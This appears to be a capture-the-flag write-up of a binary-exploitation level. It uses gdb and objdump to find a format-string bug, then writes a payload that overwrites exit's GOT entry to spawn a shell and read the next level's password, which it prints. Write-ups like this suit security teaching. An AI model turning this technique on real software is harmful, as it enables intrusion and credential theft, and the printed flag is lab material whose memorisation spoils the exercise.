## LEVEL 5
---
Most important parts:
```shell
main:
[...]
    0x0804850a <+6>:	call   0x80484c2 <n> ; Call n function without arguments
[...]
```
```shell
n:
[...]
    0x080484c5 <+3>:	sub    $0x218,%esp ; Allocate 536 bytes on the stack
[...]
    0x080484e5 <+35>:	call   0x80483a0 <fgets@plt> ; Call fgets with stdin, 512 and buffer address
    0x080484f3 <+49>:	call   0x8048380 <printf@plt> ; Call printf with buffer address
    0x080484f8 <+54>:	movl   $0x1,(%esp)
    0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```
```shell
o:
[...]
    0x080484b1 <+13>:	call   0x80483b0 <system@plt> ; Call system with "/bin/sh"
[...]
```
This level incorporates all the knowledge from the previous levels, and no new concepts are introduced. I will apply everything I have learned so far to solve this level.
In this level, it is evident that the `main` function calls `n`, but to obtain the flag, we need to call `o`.
So, I will employ the same technique as in the previous level, but this time I will overwrite the return value of n instead of a global variable.

First thing I must find is the distance between the buffer and the `$esp`. Luckily for me, the values allocated and the buffer placement are the same since the two last levels and `printf` is call in the same function that `fgets`. So I expect the distance to be 16 bytes. But I need to be sure !
```shell
(gdb) b *0x080484f3
Breakpoint 1 at 0x80484f3
(gdb) r
Starting program: /home/user/level5/level5
AAAA %p %p %p %p

Breakpoint 1, 0x080484f3 in n ()
(gdb) x/32x $esp
0xbffff510:	0xbffff520	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff520:	0x41414141	0xb7e2000a	0x00000001	0xb7fef305
(gdb) n
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
```
Perfect I was right ! Now I need to find the address of the `o` function.
```shell
$ objdump -d level5 | grep '<o>'
080484a4 <o>:
```

Now, the final aspect I need to determine is the location of the return address of `n` on the stack. However, there is a slight issue. If we examine the disassembled code of `n`, we can observe that it calls `exit` before returning. Consequently, even if we modify the return address, the program will exit before returning to `main`. Therefore, I need to explore alternative methods to achieve the desired outcome.
```shell
0x080484f8 <+54>:	movl   $0x1,(%esp)
0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```
Unfortunatly, we cannot change any of these values. Because none of them are a jump to another address.
```shell
(gdb) disas exit
Dump of assembler code for function exit@plt:
    0x080483d0 <+0>:	jmp    *0x8049838
    0x080483d6 <+6>:	push   $0x28
    0x080483db <+11>:	jmp    0x8048370
End of assembler dump
```
Nice, I may have a clue. The `exit` function is a jump to another address. So I will try to overwrite the address of the `exit` function with the address of the `o` function.
```shell
(gdb) x/x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6
(gdb) x/a 0x8048370
0x8048370:	0x981c35ff
```
The second address is not useful since it does not point to a valid address. However, the first address refers to a valid location. Therefore, there is a possibility that I can overwrite the value at `0x8049838` with the address of the `o` function.

Now I have all the information I need to write my exploit.
```shell
$ python -c 'print "\x38\x98\x04\x08" + "%134513824d"  + "%4$n"' > /tmp/payload
$ (cat /tmp/payload; echo "cat /home/user/level6/.pass") | ./level5
[...]
512
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```